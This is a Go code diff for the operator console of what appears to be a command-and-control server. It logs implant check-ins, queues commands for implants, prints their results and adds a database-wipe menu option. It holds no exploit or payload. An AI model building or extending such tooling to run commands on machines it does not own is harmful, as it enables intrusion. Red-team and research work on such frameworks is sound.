@@ -28,6 +28,17 @@ import (
 	"google.golang.org/grpc/credentials/insecure"
 )
 
+type impInfo struct {
+	UUID        string
+	Whoami      string
+	Signature   string
+	Retrieved   int32
+	Command     string
+	LastCheckIn string
+	Result      string
+	GotIt       int32
+}
+
 type impInfoStruct struct {
 	UUID        string
 	Whoami      string
@@ -72,27 +83,27 @@ func SetIt(result, uuid string) (int32, error) {
 
 	preserved_checkin := preserved_field.LastCheckIn
 
+	currentTime := time.Now()
+	currentTimeStr := currentTime.Format(time.RFC1123)
+
 	if preserved_checkin == "" {
-		fmt.Printf("\033[%dA", 2)
-		//fmt.Println()
-		fmt.Printf("\nNew implant check-in from %s \n", uuid)
-		fmt.Printf("\033[%dC", 10)
+		fmt.Printf("\033[s")
+		fmt.Printf("\033[%dD", 2)
+		fmt.Printf("\nNew implant check-in at %s from %s \n", currentTimeStr, uuid)
+		fmt.Printf("\033[u")
 	}
 
 	if prior_result != result {
-		fmt.Printf("\033[%dA", 2)
-		//fmt.Println()
+		fmt.Printf("\033[s")
+		fmt.Printf("\033[%dD", 2)
 		fmt.Printf("\nNew result %s from implant %s that ran command %s \n", result, uuid, preserved_command)
-		fmt.Printf("\033[%dC", 10)
+		fmt.Printf("\033[u")
 
 	}
 
 	if err != nil {
 		return 1, err
 	}
-
-	currentTime := time.Now()
-	currentTimeStr := currentTime.Format(time.RFC1123)
 
 	res, err := c.SendUpdate(sig_ctx, &pb.UpdateObject{UUID: uuid, Whoami: "", Signature: preserved_sig,
 		Retrieved: 0, Command: preserved_command, LastCheckIn: currentTimeStr, Result: result,
@@ -248,23 +259,14 @@ func StartGRPCServers(wg *sync.WaitGroup, stopCh chan struct{}) {
 
 		pb.RegisterBuilderServer(s, &Builder{})
 
+		pb.RegisterRemoveServer(s, &Rkey{})
+
 		if err := s.Serve(lis); err != nil {
 			log.Fatalf("failed to serve a listener: %v", err)
 		}
 		close(stopCh)
 	}()
 	<-stopCh
-}
-
-type impInfo struct {
-	UUID        string
-	Whoami      string
-	Signature   string
-	Retrieved   int32
-	Command     string
-	LastCheckIn string
-	Result      string
-	GotIt       int32
 }
 
 func startListener(address, port string) (string, error) {
@@ -331,6 +333,7 @@ func set(command, uuid, signature string) (int32, error) {
 		return 1, err
 	}
 	preserved_result := preserved_field.Result
+	preserved_checkin := preserved_field.LastCheckIn
 
 	data := impInfo{
 		// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
@@ -340,7 +343,7 @@ func set(command, uuid, signature string) (int32, error) {
 		// We are accidentally overwriting the result here
 		// This will be true for all the fields but the main issue is the result
 		// Need to get current result then preserve it then set it
-		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: "", Result: preserved_result, GotIt: 0,
+		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: preserved_checkin, Result: preserved_result, GotIt: 0,
 	}
 
 	res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
@@ -354,6 +357,29 @@ func set(command, uuid, signature string) (int32, error) {
 	}
 
 	return code, nil
+
+}
+
+func remKey(uuid string) (int32, error) {
+	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
+	if err != nil {
+		return 1, err
+	}
+
+	defer conn.Close()
+
+	c := pb.NewRemoveClient(conn)
+
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+
+	defer cancel()
+	fmt.Println("Calling remkey function")
+	code, err := c.RemKey(ctx, &pb.DelKey{Key: uuid})
+	if err != nil {
+		return code.Code, err
+	}
+
+	return code.Code, nil
 
 }
 
@@ -647,6 +673,20 @@ func main() {
 					fmt.Printf("Code error: %s \n", code)
 				}
 				fmt.Println("Started")
+
+			case input == "6":
+				var key string
+				fmt.Printf("Wipe the DB \n")
+				fmt.Printf("This will remove all entries \n")
+				fmt.Printf("Type yes to continue \n")
+				fmt.Scan(&key)
+				key = strings.ReplaceAll(key, "\n", "")
+				key = strings.ToLower(key)
+				if key != "yes" {
+					break
+				} else {
+					_, _ = remKey(key)
+				}
 
 			case input == "help":
 				fmt.Printf("Help menu \n")
